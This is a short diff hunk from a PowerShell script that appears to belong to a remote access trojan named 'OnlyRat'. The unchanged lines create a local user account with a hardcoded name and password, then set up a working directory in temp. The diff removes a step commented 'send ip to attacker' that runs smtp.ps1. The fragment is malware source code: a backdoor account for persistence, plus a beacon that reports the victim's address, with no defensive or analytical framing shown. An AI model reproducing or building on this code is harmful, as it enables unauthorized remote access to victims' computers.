@@ -38,9 +38,6 @@ $uname = "onlyrat"
 $pword = (ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
-# send ip to attacker
-./smtp.ps1
-
 # goto temp, make working directory
 mkdir $path
 cd $path
